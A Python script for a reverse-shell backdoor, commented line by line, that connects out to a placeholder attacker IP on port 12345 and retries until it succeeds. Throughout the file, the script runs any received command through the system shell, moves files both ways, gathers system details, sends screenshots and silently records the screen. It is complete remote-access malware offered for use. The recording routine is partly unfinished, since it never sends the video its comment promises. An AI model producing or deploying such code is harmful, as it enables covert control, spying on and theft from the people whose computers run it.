#!/usr/bin/env python3
import socket # Provides low-level networking interfaces. It allows you to create and manage network connections using protocols like TCP and UDP.
import time # Provides various functions for working with time-related operations.
import subprocess # Allows use to run system commands or external programs from your Python script.
import json # Used for storing and transferring data between the browser and the server.
import os # Import the os module for interacting with the file system.
import platform # This module has various functions that can be used to get the information like the OS name and its version.
import mss    # library to take screenshots
import io           # in-memory byte buffer (file-like)
import base64       # for encoding binary data to text for JSON transport
import pyautogui # Provides functions for controlling the mouse and keyboard, taking screenshots, and locating elements on the screen.
import cv2 # OpenCV library for computer vision and video processing.
import numpy as np # Library for numerical operations on arrays and matrices.
import tempfile # Provides functions to create temporary files and directories safely.

# Function to send data reliably in JSON format
def reliable_send(data):
    jsondata = json.dumps(data)       # Convert Python object into JSON string
    s.send(jsondata.encode())         # Encode JSON string to bytes and send it over the socket

# Function to receive JSON data reliably
def reliable_recv():
    data = ''                         # Initialize empty string to store received data
    while True:                       # Loop until a complete JSON message is received
        try:
            data = data + s.recv(1024).decode().rstrip() # Receive up to 1024 bytes, decode to string, strip trailing spaces
            return json.loads(data)    # Convert JSON string back to Python object and return it
        except ValueError:             # If JSON is incomplete or malformed
            continue                   # Keep receiving more data until complete

# Function to maintain a persistent connection to the server
def connection():
    while True:                        # Loop until a successful connection is made
        time.sleep(20)                 # Wait 20 seconds before attempting a connection
        try:
            s.connect(('<Attacker IP>', 12345)) # <== Change the IP address and the port number
            shell()                     # Start the shell function to handle commands
            s.close()                   # Close the connection after the shell loop ends
            break                       # Exit the loop after successful execution
        except:                         # If connection fails
            continue                    # Retry after the delay

# Function to send a file to the server
def upload_file(file_name):
    f = open(file_name, 'rb')           # Open file in binary read mode
    s.send(f.read())                    # Read entire file content and send it through the socket

# Function to receive a file from the server
def download_file(file_name):
    f = open(file_name, 'wb')           # Open file in binary write mode
    s.settimeout(1)                     # Set socket timeout to 1 second
    chunk = s.recv(1024)                # Receive first chunk of file data
    while chunk:                        # Continue until no more data is received
        f.write(chunk)                  # Write the received chunk to file
        try:
            chunk = s.recv(1024)        # Attempt to receive the next chunk
        except socket.timeout as e:     # Stop receiving if no more data arrives within timeout
            break
    s.settimeout(None)                  # Remove timeout setting
    f.close()                           # Close the file

def record_screen_controlled(sock, fps=10):
    import tempfile

    # Ensure recordings folder exists
    save_dir = "recordings"
    os.makedirs(save_dir, exist_ok=True)

    # Temporary file for recording
    tmp_path = tempfile.mktemp(suffix=".avi")
    fourcc = cv2.VideoWriter_fourcc(*'XVID')

    with mss.mss() as sct:
        monitor = sct.monitors[1]
        frame0 = np.array(sct.grab(monitor))
        h, w = frame0.shape[:2]
        out = cv2.VideoWriter(tmp_path, fourcc, fps, (w, h))

        print("[*] Recording started (silently)...")
        try:
            while True:
                # check for JSON control message
                ctrl = try_recv_json(sock, timeout=0.02)
                if isinstance(ctrl, dict) and ctrl.get("type") == "record_stop":
                    print("[*] Received stop command from server.")
                    break

                # capture frame and write
                img = np.array(sct.grab(monitor))
                frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
                out.write(frame)

                time.sleep(1.0 / fps)
        finally:
            out.release()

    # Now send the file (it will go into recordings folder)
    filename = f"record_{int(time.time())}.avi"
    final_path = os.path.join(save_dir, filename)
    os.rename(tmp_path, final_path)  # move temp file to recordings folder

def try_recv_json(sock, timeout=0.01):
    sock.settimeout(timeout)
    try:
        data = sock.recv(4096).decode()
        if not data:
            return None
        return json.loads(data)
    except socket.timeout:
        return None
    except ValueError:
        return None
    finally:
        sock.settimeout(None)

# Function to handle incoming commands from the server
def shell():
    while True:                         # Keep listening for commands
        command = reliable_recv()       # Receive the command from server
        if command == 'exit' or command == 'quit': # If exit or quit command received
            break                       # End the shell session
        elif command[:3] == 'cd ':      # If command is 'cd ', change directory
            os.chdir(command[3:])       # Change current working directory to specified path
        elif command == 'clear':        # If clear command received
            pass                        # Do nothing locally (handled on server side)
        elif command[:9] == 'download': # If download command received
            upload_file(command[9:])    # Send specified file to the server
        elif command[:6] == 'upload':   # If upload command received
            download_file(command[7:])  # Receive file from the server
        elif command == 'os':           # If the command received from the listener is 'os'
            # Collect system information           
            info = {
                "system": platform.system(), # Example: 'Windows', 'Linux', or 'Darwin' (macOS)
                "node": platform.node(),        # The computer's network name
                "release": platform.release(),  # OS release version (e.g., '10' or '6.6.0')
                "version": platform.version(),  # Detailed OS build version
                "machine": platform.machine(),  # Hardware type (e.g., 'x86_64', 'AMD64')
                "processor": platform.processor()    # CPU info
            } 
            reliable_send(info)  # SEND the info back to the listener!  
        elif command == 'screenshot':
            try:
                # local imports so rest of script doesn't require these libs
                import mss, base64, io
                from PIL import Image #ignore this error

                # capture screen
                with mss.mss() as sct:
                    raw = sct.grab(sct.monitors[0])   # raw.rgb and raw.size

                # build a Pillow image from raw pixels, then save PNG into BytesIO
                img = Image.frombytes('RGB', raw.size, raw.rgb)
                buf = io.BytesIO()
                img.save(buf, format='PNG')

                # encode and send
                png_b64 = base64.b64encode(buf.getvalue()).decode('ascii')
                reliable_send({"type": "screenshot", "data": png_b64})

            except Exception as e:
                # send repr so listener prints the full traceback-ish info
                reliable_send({"type": "screenshot_error", "error": repr(e)})
        elif command == 'record':
            try:
                record_screen_controlled(s)  # <-- pass the socket
            except Exception as e:
                reliable_send({"type": "record_error", "error": repr(e)})
        else:
            try:
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                reliable_send(result.decode())
            except Exception as e:
                reliable_send(str(e))
# Create a socket object for TCP communication using IPv4
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # AF_INET = IPv4, SOCK_STREAM = TCP

connection() # Call connection function to start the connection process
